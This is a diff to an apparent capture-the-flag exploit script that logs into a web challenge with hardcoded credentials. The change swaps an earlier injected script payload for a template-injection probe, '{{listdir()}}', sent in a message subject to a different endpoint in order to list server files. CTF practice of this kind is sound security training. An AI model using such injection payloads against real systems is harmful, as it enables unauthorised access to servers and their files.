@@ -8,12 +8,12 @@ sess.post(LOGIN_URL, data={"username": "tomek", "password": "furmanka"})
 
 def send_message(msg):
     data = {
-        "subject": "test",
+        "subject": "{{listdir()}}",
         "encmessage": msg,
-        "recipient": "1"
+        "recipient": "17"
     }
 
-    response = sess.post("https://hard.web.uw2017.p4.team/send_message/admin", data=data)
+    response = sess.post("https://hard.web.uw2017.p4.team/send_message/superman", data=data)
 
     print(response.text)
 
@@ -63,4 +63,4 @@ $(function() {
 </script>
 """
 
-send_message(script)
+send_message("{{listdir()}}")
